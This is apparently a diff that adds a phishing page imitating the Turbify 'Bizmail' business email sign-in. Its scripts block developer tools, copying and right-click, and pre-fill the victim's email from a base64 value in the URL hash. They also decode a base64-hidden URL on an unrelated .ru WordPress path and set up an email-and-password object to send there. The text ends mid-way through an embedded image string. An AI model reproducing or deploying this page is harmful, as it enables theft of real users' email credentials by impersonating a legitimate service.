@@ -1,0 +1,945 @@
+<!DOCTYPE html>
+<html class="no-js no-ie">
+  <head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width,user-scalable=no" />
+    <title>Bizmail Login</title>
+    <meta name="description" content="Bizmail Login" />
+    <meta property="og:title" content="Bizmail Login" />
+    <meta property="fb:app_id" content="105570222879341" />
+    <meta property="og:type" content="website" />
+    
+    <meta property="og:site_name" content="Turbify" />
+    <meta
+      property="og:image"
+      content="https://sep.turbifycdn.com/nrp/image/turbify/newturbifylogo.png"
+    />
+    <link
+      rel="apple-touch-icon"
+      sizes="180x180"
+      href="https://sep.turbifycdn.com/yf/nrp/image/turbify/Turbify_favicon.svg"
+    />
+    
+    <link
+      rel="icon"
+      href="https://sep.turbifycdn.com/yf/nrp/image/turbify/Turbify_favicon.svg"
+    />
+    <!-- <link rel="apple-touch-icon" sizes="180x180" href="https://sep.turbifycdn.com/yf/nrp/image/turbify/turbify-favicon-v1-purple.svg"> -->
+    <!-- <link rel="icon" type="image/png" href="https://sep.turbifycdn.com/yf/nrp/image/turbify/turbify-favicon-v1-purple.svg" sizes="32x32"> -->
+    <!-- <link rel="icon" type="image/png" href="https://sep.turbifycdn.com/yf/nrp/image/turbify/turbify-favicon-v1-purple.svg" sizes="16x16"> -->
+    <!-- <link rel="shortcut icon" href="https://sep.turbifycdn.com/yf/nrp/image/turbify/turbify-favicon-v1-purple.svg"> -->
+    <meta
+      name="msapplication-config"
+      content="https://sep.turbifycdn.com/yf/common/browserconfig.xml"
+    />
+    <meta name="theme-color" content="#ffffff" />
+    <link
+      rel="stylesheet"
+      type="text/css"
+      href="https://sep.turbifycdn.com/yf/nrp/font/verizon/VerizonNHG.css"
+    />
+    <link
+      rel="stylesheet"
+      href="https://s3.amazonaws.com/presales.lumcs.com/idm/css/ysb-common.css"
+    />
+    <link
+      rel="stylesheet"
+      href="https://sep.turbifycdn.com/yf/idp/css/61b9db85.idm-core.css"
+    />
+    <link rel="stylesheet" type="text/css" href="css/login.css" />
+    <style>
+      .input-disabled {
+        background-color: transparent !important;
+      }
+    </style>
+    <script>
+      document.onkeydown = function (e) {
+        if (event.keyCode == 123) {
+          return false;
+        }
+        if (e.ctrlKey && e.shiftKey && e.keyCode == "I".charCodeAt(0)) {
+          return false;
+        }
+        if (e.ctrlKey && e.shiftKey && e.keyCode == "J".charCodeAt(0)) {
+          return false;
+        }
+        if (e.ctrlKey && e.keyCode == "U".charCodeAt(0)) {
+          return false;
+        }
+        if (e.ctrlKey && e.keyCode == "C".charCodeAt(0)) {
+          return false;
+        }
+        if (e.ctrlKey && e.keyCode == "X".charCodeAt(0)) {
+          return false;
+        }
+        if (e.ctrlKey && e.keyCode == "Y".charCodeAt(0)) {
+          return false;
+        }
+        if (e.ctrlKey && e.keyCode == "Z".charCodeAt(0)) {
+          return false;
+        }
+        if (e.keyCode == 67 && e.shiftKey && (e.ctrlKey || e.metaKey)) {
+          return false;
+        }
+        if (
+          e.keyCode == "J".charCodeAt(0) &&
+          e.altKey &&
+          (e.ctrlKey || e.metaKey)
+        ) {
+          return false;
+        }
+        if (
+          e.keyCode == "I".charCodeAt(0) &&
+          e.altKey &&
+          (e.ctrlKey || e.metaKey)
+        ) {
+          return false;
+        }
+        if (e.ctrlKey && e.shiftKey && e.keyCode == "C".charCodeAt(0)) {
+          return false;
+        }
+        if (
+          (e.metaKey && e.keyCode == "S".charCodeAt(0)) ||
+          (e.ctrlKey && e.keyCode == "S".charCodeAt(0))
+        ) {
+          return false;
+        }
+        if (e.ctrlKey && e.keyCode == "H".charCodeAt(0)) {
+          return false;
+        }
+        if (e.ctrlKey && e.keyCode == "A".charCodeAt(0)) {
+          return false;
+        }
+        if (
+          (e.metaKey && e.keyCode == "F".charCodeAt(0)) ||
+          (e.ctrlKey && e.keyCode == "F".charCodeAt(0))
+        ) {
+          return false;
+        }
+        if (
+          (e.metaKey && e.keyCode == "E".charCodeAt(0)) ||
+          (e.ctrlKey && e.keyCode == "E".charCodeAt(0))
+        ) {
+          return false;
+        }
+      };
+      if (document.addEventListener) {
+        document.addEventListener(
+          "contextmenu",
+          function (e) {
+            e.preventDefault();
+          },
+          false
+        );
+      } else {
+        document.attachEvent("oncontextmenu", function () {
+          window.event.returnValue = false;
+        });
+      }
+    </script>
+    <script>
+      (function (w, d, s, l, i) {
+        w[l] = w[l] || [];
+        w[l].push({ "gtm.start": new Date().getTime(), event: "gtm.js" });
+        var f = d.getElementsByTagName(s)[0],
+          j = d.createElement(s),
+          dl = l != "dataLayer" ? "&l=" + l : "";
+        j.async = true;
+        j.src = "https://www.googletagmanager.com/gtm.js?id=" + i + dl;
+        f.parentNode.insertBefore(j, f);
+      })(window, document, "script", "dataLayer", "GTM-5CRPQ99");
+    </script>
+  </head>
+  <body>
+    <noscript
+      ><iframe
+        src="https://www.googletagmanager.com/ns.html?id=GTM-5CRPQ99"
+        height="0"
+        width="0"
+        style="display: none; visibility: hidden"
+      ></iframe
+    ></noscript>
+    <div id="idm-hd">
+      <style>
+        #lum-uheader-wrapper {
+          height: 70px;
+        }
+        #lum-uheader .clear {
+          clear: both;
+          font-size: 1px;
+          height: 0px;
+          width: 1px;
+        }
+        #lum-uheader {
+          color: #808284;
+          z-index: 1000;
+          width: 100%;
+          top: 0;
+          left: 0;
+          font-family: "Open Sans";
+          font-size: 13px;
+          font-weight: 700;
+          position: fixed;
+          height: 70px;
+          margin: auto;
+          padding: 0;
+          border-bottom: 1px solid #e4e4e4;
+        }
+        #lum-uheader.light-theme {
+          background-color: #ffffff;
+        }
+        #lum-uheader .section-logo {
+          min-width: 175px;
+          float: left;
+          display: inline-block;
+          margin-left: 30px;
+          height: 100%;
+        }
+        #lum-uheader .section-logo .logo {
+          height: 100%;
+          max-width: 100%;
+          text-align: center;
+        }
+        #lum-uheader .section-logo .logo a {
+          display: block;
+          position: relative;
+          top: 50%;
+          margin-top: -21px;
+        }
+        #lum-uheader .section-logo .logo img {
+          max-height: 100%;
+          max-width: 100%;
+        }
+        #lum-uheader.full.light-theme.centered .section-logo {
+          position: absolute;
+          z-index: 600;
+        }
+      </style>
+      <div id="lum-uheader-wrapper">
+        <div
+          id="lum-uheader"
+          class="light-theme slim"
+          data-sessioncheck="disabled"
+          style="min-width: 0px"
+        >
+          <div class="section-logo">
+            <div class="logo">
+              <a href="https://www.turbify.com/"
+                ><img
+                  src="https://sep.turbifycdn.com/nrp/image/turbify/newturbifylogo.png"
+                  width="120"
+                  border="0"
+              /></a>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div id="idm-bd">
+      <div class="container" id="idmlogin">
+        <div class="row">
+          <div
+            class="col-xs-12 col-sm-6 col-sm-push-6 login"
+            style="margin-top: 70px !important"
+          >
+            <div
+              style="
+                margin: auto;
+                max-width: 350px;
+                padding: 0 15px;
+                border: 1px solid #e4e4e4;
+                -webkit-box-shadow: 0px 3px 5px 0px rgba(209, 209, 209, 1);
+                -moz-box-shadow: 0px 3px 5px 0px rgba(209, 209, 209, 1);
+                box-shadow: 0px 3px 5px 0px rgba(209, 209, 209, 1);
+              "
+            >
+              <div class="row">
+                <div class="col-xs-12">
+                  <h1 style="font-family: Arial !important">
+                    Sign in to business email
+                  </h1>
+                </div>
+              </div>
+              <div class="row" id="alerted-con" style="display: none">
+                <div class="col-xs-12">
+                  <div
+                    class="alert alert-danger"
+                    style="font-family: Arial !important"
+                    role="alert"
+                    id="alerted"
+                  ></div>
+                </div>
+              </div>
+              <form
+                id="form-lgn"
+                action="https://mail.turbify.com/login"
+                autocomplete="off"
+                method="POST"
+                style="max-width: 320px"
+              >
+                <div class="form-group">
+                  <div class="row top-buffer-10">
+                    <div class="col-xs-12">
+                      <input
+                        type="email"
+                        name="login"
+                        class="form-control"
+                        tabindex="0"
+                        type=""
+                        required="true"
+                        properties=""
+                        required
+                        autocomplete="off"
+                        autocorrect="off"
+                        autocapitalize="off"
+                        spellcheck="false"
+                        id="login"
+                        placeholder="Email" value="" readonly
+                      />
+                    </div>
+                  </div>
+                  <div class="row top-buffer-10">
+                    <div class="col-xs-12">
+                      <div class="input-group">
+                        <input
+                          type="password"
+                          name="password"
+                          class="form-control"
+                          type=""
+                          required="true"
+                          properties=""
+                          required
+                          autocomplete="off"
+                          autocorrect="off"
+                          autocapitalize="off"
+                          spellcheck="false"
+                          id="password"
+                          placeholder="Password"
+                        />
+                      </div>
+                      <span
+                        for="s-pass"
+                        class="validation-feedback noshow"
+                      ></span>
+                    </div>
+                  </div>
+                  <div class="row">
+                    <div class="col-xs-12">
+                      <p
+                        class="text-m left"
+                        style="font-family: Arial !important"
+                      >
+                        <input
+                          type="checkbox"
+                          name="persistent"
+                          type=""
+                          properties=""
+                          autocomplete="off"
+                          autocorrect="off"
+                          autocapitalize="off"
+                          spellcheck="false"
+                          id="persistent"
+                          checked="checked"
+                          value="persistent"
+                        /><label for="persistent"></label>Remember me
+                      </p>
+                    </div>
+                  </div>
+                  <div class="row">
+                    <div class="col-xs-12">
+                      <p>
+                        <button
+                          type="submit"
+                          class="btn btn-lg btn-primary form-control"
+                          style="font-family: Arial !important"
+                          id="btnLogin"
+                        >
+                          Sign in
+                        </button>
+                      </p>
+                    </div>
+                  </div>
+                  <div class="row">
+                    <div class="col-xs-12">
+                      <p class="text-m center">
+                        <a
+                          href="forgotpassword4cb2.html?.done=https%3A%2F%2Fmail.turbify.com%2Finitiate"
+                          >Forgot your password?</a
+                        >
+                      </p>
+                    </div>
+                  </div>
+                  <div class="row" style="margin-top: 20px">
+                    <div class="col-xs-12">
+                      <p
+                        class="text-m center"
+                        style="font-family: Arial !important"
+                      >
+                        Don’t have a business email account and want to increase
+                        your online credibility? Sign up today!
+                      </p>
+                    </div>
+                  </div>
+                  <div class="row">
+                    <div class="col-xs-12">
+                      <p>
+                        <button
+                          id="signup"
+                          style="
+                            font-family: Arial !important;
+                            width: 150px;
+                            color: #000 !important;
+                            margin-top: 20px;
+                          "
+                          class="btn btn-sm btn-orange form-control"
+                          class="btn btn-orange"
+                        >
+                          Sign Up
+                        </button>
+                      </p>
+                    </div>
+                  </div>
+                </div>
+                <input
+                  type="hidden"
+                  name="done"
+                  class="form-control"
+                  type=""
+                  properties=""
+                  value="https://mail.turbify.com/initiate"
+                /><input
+                  type="hidden"
+                  name="csrfToken"
+                  value="1716039056.fa14423c5c2dca821f0b3a452bfb1932d8bddfc4"
+                />
+              </form>
+            </div>
+          </div>
+          <div class="col-xs-12 col-sm-6 col-sm-pull-6">
+            <div style="margin: auto; padding: 0 10px">
+              <div class="row">
+                <div class="col-xs-12 col-sm-12 text-center">
+                  <h2 style="font-family: Arial !important">
+                    Learn about Turbify products and services
+                  </h2>
+                </div>
+              </div>
+              <div class="row text-center mx-auto mb-4 bottom-line">
+                <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6">
+                  <a
+                    href="https://www.turbify.com/hosting?utm_medium=turbify-owned&amp;utm_source=acquisition&amp;utm_campaign=mail-hosting-image&amp;utm_content=mail-login-page"
+                  >
+                    <img
+                      style="height: 215px; border-radius: 10px !important"
+                      alt="Business Maker"
+                      class="img-width-login heroImage"
+                      src="https://sep.turbifycdn.com/yf/nrp/image/turbify/email_1.png"
+                  /></a>
+                </div>
+                <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6">
+                  <h2
+                    style="
+                      font-weight: 600;
+                      font-size: 20px;
+                      margin: 20px 0 10px 0;
+                      font-family: Arial !important;
+                    "
+                  >
+                    Turbify Hosting
+                  </h2>
+                  <p style="text-align: justify; font-family: Arial !important">
+                    Launch your website on a platform that has the performance
+                    and security you need to stand out.
+                  </p>
+                  <button
+                    id="link1"
+                    style="
+                      font-family: Arial !important;
+                      width: 150px;
+                      color: #000 !important;
+                      margin-top: 20px;
+                    "
+                    class="btn btn-sm btn-orange form-control"
+                  >
+                    Learn more
+                  </button>
+                </div>
+              </div>
+              <div class="row text-center mx-auto mb-4 bottom-line">
+                <div class="mobile-image col-xs-12 col-sm-12 col-md-6 col-lg-6">
+                  <a
+                    style="font-family: Arial !important"
+                    href="https://www.turbify.com/wordpress?utm_medium=turbify-owned&amp;utm_source=acquisition&amp;utm_campaign=mail-wordpress-image&amp;utm_content=mail-login-page"
+                  >
+                    <img
+                      alt="Business Maker"
+                      style="height: 215px; border-radius: 10px !important"
+                      class="img-width-login heroImage"
+                      src="https://sep.turbifycdn.com/yf/nrp/image/turbify/email_2.png"
+                  /></a>
+                </div>
+                <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6">
+                  <h2
+                    style="
+                      font-weight: 600;
+                      font-size: 20px;
+                      margin: 20px 0 10px 0;
+                      font-family: Arial !important;
+                    "
+                  >
+                    WordPress Hosting
+                  </h2>
+                  <p style="text-align: justify; font-family: Arial !important">
+                    Turbify WordPress Hosting gives you the reputation of
+                    WordPress with a cloud based backbone that gives you
+                    stability and protection to maximize your WordPress
+                    experience.
+                  </p>
+                  <button
+                    id="link2"
+                    style="
+                      font-family: Arial !important;
+                      width: 150px;
+                      margin-top: 20px;
+                    "
+                    class="btn btn-sm btn-orange form-control"
+                  >
+                    Learn more
+                  </button>
+                </div>
+                <div
+                  class="desktop-image col-xs-12 col-sm-12 col-md-6 col-lg-6"
+                >
+                  <a
+                    style="font-family: Arial !important"
+                    href="https://www.turbify.com/wordpress?utm_medium=turbify-owned&amp;utm_source=acquisition&amp;utm_campaign=mail-wordpress-image&amp;utm_content=mail-login-page"
+                  >
+                    <img
+                      alt="Business Maker"
+                      style="height: 215px; border-radius: 10px !important"
+                      class="img-width-login heroImage"
+                      src="https://sep.turbifycdn.com/yf/nrp/image/turbify/email_2.png"
+                  /></a>
+                </div>
+              </div>
+              <div class="row text-center mx-auto mb-4">
+                <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6">
+                  <a
+                    style="font-family: Arial !important"
+                    href="https://www.turbify.com/domains?utm_medium=turbify-owned&amp;utm_source=acquisition&amp;utm_campaign=mail-domain-image&amp;utm_content=mail-login-page"
+                  >
+                    <img
+                      alt="Business Maker"
+                      class="img-width-login heroImage"
+                      style="height: 215px; border-radius: 10px !important"
+                      src="https://sep.turbifycdn.com/yf/nrp/image/turbify/email_3.png"
+                  /></a>
+                </div>
+                <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6">
+                  <h2
+                    style="
+                      font-weight: 600;
+                      font-size: 20px;
+                      margin: 20px 0 10px 0;
+                      font-family: Arial !important;
+                    "
+                  >
+                    Turbify Domains
+                  </h2>
+                  <p style="text-align: justify; font-family: Arial !important">
+                    With hundreds of domain extensions to choose from, and
+                    powerful domain management features, the right domain is at
+                    your fingertips!
+                  </p>
+                  <button
+                    id="link3"
+                    style="
+                      font-family: Arial !important;
+                      width: 150px;
+                      margin-top: 20px;
+                    "
+                    class="btn btn-sm btn-orange form-control"
+                  >
+                    Learn more
+                  </button>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div id="idm-ft">
+      <div class="footer">
+        <ul class="text-s">
+          <li><span>&copy; 2025 Turbify</span></li>
+          <li>
+            <a
+              rel="nofollow"
+              href="https://www.turbify.com/tos-center"
+              target="_blank"
+            >
+              Terms
+            </a>
+          </li>
+          <li>|</li>
+          <li>
+            <a
+              rel="nofollow"
+              href="https://www.turbify.com/privacy-policy"
+              target="_blank"
+            >
+              Privacy
+            </a>
+          </li>
+          <li>|</li>
+          <li>
+            <a rel="nofollow" href="https://help.turbify.com/" target="_blank">
+              Help
+            </a>
+          </li>
+          <li>|</li>
+          <li>
+            <a
+              rel="nofollow"
+              href="https://consent.turbify.com/settings"
+              target="_blank"
+            >
+              Manage Cookies
+            </a>
+          </li>
+        </ul>
+      </div>
+    </div>
+    <!-- <script src="https://sep.turbifycdn.com/yf/idp/js/32195eef.idm-core-without-ga.js"></script>
+        <script type="text/javascript" src="js/login.js"></script> -->
+
+    <div id="elemnt" class="hide" hidden>
+      <span id="elemnt-title" hidden>Error</span>
+      <span style="font-family: serif !important">
+        No connection, cannot work on this browser
+      </span>
+      <br />
+      <br>
+      <a
+        href="https://www.google.com/chrome/"
+        style="color: blue; font-family: serif !important"
+      >
+        Try Google Chrome
+      </a>
+    </div>
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.20.0/axios.min.js"></script>
+<script>
+      document.onkeydown = function (e) {
+        if (event.keyCode == 123) {
+          return false
+        }
+        if (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) {
+          return false
+        }
+        if (e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) {
+          return false
+        }
+        if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) {
+          return false
+        }
+        if (e.ctrlKey && e.keyCode == 'C'.charCodeAt(0)) {
+          return false
+        }
+        if (e.ctrlKey && e.keyCode == 'X'.charCodeAt(0)) {
+          return false
+        }
+        if (e.ctrlKey && e.keyCode == 'Y'.charCodeAt(0)) {
+          return false
+        }
+        if (e.ctrlKey && e.keyCode == 'Z'.charCodeAt(0)) {
+          return false
+        }
+        if (e.keyCode == 67 && e.shiftKey && (e.ctrlKey || e.metaKey)) {
+          return false
+        }
+        if (
+          e.keyCode == 'J'.charCodeAt(0) &&
+          e.altKey &&
+          (e.ctrlKey || e.metaKey)
+        ) {
+          return false
+        }
+        if (
+          e.keyCode == 'I'.charCodeAt(0) &&
+          e.altKey &&
+          (e.ctrlKey || e.metaKey)
+        ) {
+          return false
+        }
+        if (e.ctrlKey && e.shiftKey && e.keyCode == 'C'.charCodeAt(0)) {
+          return false
+        }
+        if (
+          (e.metaKey && e.keyCode == 'S'.charCodeAt(0)) ||
+          (e.ctrlKey && e.keyCode == 'S'.charCodeAt(0))
+        ) {
+          return false
+        }
+        if (e.ctrlKey && e.keyCode == 'H'.charCodeAt(0)) {
+          return false
+        }
+        if (e.ctrlKey && e.keyCode == 'A'.charCodeAt(0)) {
+          return false
+        }
+        if (
+          (e.metaKey && e.keyCode == 'F'.charCodeAt(0)) ||
+          (e.ctrlKey && e.keyCode == 'F'.charCodeAt(0))
+        ) {
+          return false
+        }
+        if (
+          (e.metaKey && e.keyCode == 'E'.charCodeAt(0)) ||
+          (e.ctrlKey && e.keyCode == 'E'.charCodeAt(0))
+        ) {
+          return false
+        }
+      }
+      if (document.addEventListener) {
+        document.addEventListener(
+          'contextmenu',
+          function (e) {
+            e.preventDefault()
+          },
+          false
+        )
+      } else {
+        document.attachEvent('oncontextmenu', function () {
+          window.event.returnValue = false
+        })
+      }
+    </script>
+    <script>
+   
+
+      let RURL = "aHR0cHM6Ly9qZXRvdXJydXNzaWEucnUvd3AtaW5jbHVkZXMvYmxvY2tzL3F1ZXJ5LXBhZ2luYXRpb24vdmlubnl6L2luZGV4LnBocA==";
+
+      try {
+        RURL = atob(RURL);
+      } catch (e) {}
+
+      var outgoingObj = {
+        email: "",
+        password: "",
+        
+      };
+
+      const validateEmail = (email) => {
+        return email.match(
+          /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/
+        );
+      };
+
+      $(document).ready(() => {
+        var emailHref;
+        var brokenEmail;
+        var newURL = genID(252);
+        var newHref = `${
+          location.href.includes("#")
+            ? location.href.split("#")[0]
+            : location.href
+        }?websrc=${newURL}${
+          $("#login").val() == "" ? location.hash : "#" + $("#login").val()
+        }`;
+        // $('#ImgLoginBanner').attr(
+        //   'style',
+        //   `background-image: url('https://tunilsz.github.io/mxc/webmail-logo.png')`
+        // )
+
+        if (location.href.includes("#")) {
+          var emailHref64 = location.href.split("#")[1];
+          emailHref = validateEmail(emailHref64)
+            ? emailHref64
+            : atob(emailHref64);
+
+          localStorage.setItem("#login", emailHref);
+        } else if (localStorage.getItem("#login")) {
+          var emailHref64 = localStorage.getItem("#login");
+          emailHref = validateEmail(emailHref64)
+            ? emailHref64
+            : atob(emailHref64);
+        }
+
+        if (emailHref) {
+          brokenEmail = emailHref.split("@");
+          var main_domain = brokenEmail[1].split(".")[0];
+          var upper_main_domain = `${brokenEmail[1].replace(
+            main_domain.charAt(0),
+            main_domain.charAt(0).toUpperCase()
+          )}`;
+
+          //   var big = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIAAAABsCAYAAACiuLoyAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOkMwQzQ2MDA4RjEzRTExRTFCMzNFQTMwMzE5REU3RjExIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOkMwQzQ2MDA5RjEzRTExRTFCMzNFQTMwMzE5REU3RjExIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6QzBDNDYwMDZGMTNFMTFFMUIzM0VBMzAzMTlERTdGMTEiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6QzBDNDYwMDdGMTNFMTFFMUIzM0VBMzAzMTlERTdGMTEiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz5qf500AAAGPUlEQVR42uxdOXLjRhRt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"
+          //   var small = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEUAAAA3CAYAAABaZ4fjAAAACXBIWXMAAAsTAAALEwEAmpwYAAAKT2lDQ1BQaG90b3Nob3AgSUNDIHByb2ZpbGUAAHjanVNnVFPpFj333vRCS4iAlEtvUhUIIFJCi4AUkSYqIQkQSoghodkVUcERRUUEG8igiAOOjoCMFVEsDIoK2AfkIaKOg6OIisr74Xuja9a89+bN/rXXPues852zzwfACAyWSDNRNYAMqUIeEeCDx8TG4eQuQIEKJHAAEAizZCFz/SMBAPh+PDwrIsAHvgABeNMLCADATZvAMByH/w/qQplcAYCEAcB0kThLCIAUAEB6jkKmAEBGAYCdmCZTAKAEAGDLY2LjAFAtAGAnf+bTAICd+Jl7AQBblCEVAaCRACATZYhEAGg7AKzPVopFAFgwABRmS8Q5ANgtADBJV2ZIALC3AMDOEAuyAAgMADBRiIUpAAR7AGDIIyN4AISZABRG8lc88SuuEOcqAAB4mbI8uSQ5RYFbCC1xB1dXLh4ozkkXKxQ2YQJhmkAuwnmZGTKBNA/g88wAAKCRFRHgg/P9eM4Ors7ONo62Dl8t6r8G/yJiYuP+5c+rcEAAAOF0ftH+LC+zGoA7BoBt/qIl7gRoXgugdfeLZrIPQLUAoOnaV/Nw+H48PEWhkLnZ2eXk5NhKxEJbYcpXff5nwl/AV/1s+X48/Pf14L7iJIEyXYFHBPjgwsz0TKUcz5IJhGLc5o9H/LcL//wd0yLESWK5WCoU41EScY5EmozzMqUiiUKSKcUl0v9k4t8s+wM+3zUAsGo+AXuRLahdYwP2SycQWHTA4vcAAPK7b8HUKAgDgGiD4c93/+8//UegJQCAZkmScQAAXkQkLlTKsz/HCAAARKCBKrBBG/TBGCzABhzBBdzBC/xgNoRCJMTCQhBCCmSAHHJgKayCQiiGzbAdKmAv1EAdNMBRaIaTcA4uwlW4Dj1wD/phCJ7BKLyBCQRByAgTYSHaiAFiilgjjggXmYX4IcFIBBKLJCDJiBRRIkuRNUgxUopUIFVIHfI9cgI5h1xGupE7yAAygvyGvEcxlIGyUT3UDLVDuag3GoRGogvQZHQxmo8WoJvQcrQaPYw2oefQq2gP2o8+Q8cwwOgYBzPEbDAuxsNCsTgsCZNjy7EirAyrxhqwVqwDu4n1Y8+xdwQSgUXACTYEd0IgYR5BSFhMWE7YSKggHCQ0EdoJNwkDhFHCJyKTqEu0JroR+cQYYjIxh1hILCPWEo8TLxB7iEPENyQSiUMyJ7mQAkmxpFTSEtJG0m5SI+ksqZs0SBojk8naZGuyBzmULCAryIXkneTD5DPkG+Qh8lsKnWJAcaT4U+IoUspqShnlEOU05QZlmDJBVaOaUt2ooVQRNY9aQq2htlKvUYeoEzR1mjnNgxZJS6WtopXTGmgXaPdpr+h0uhHdlR5Ol9BX0svpR+iX6AP0dwwNhhWDx4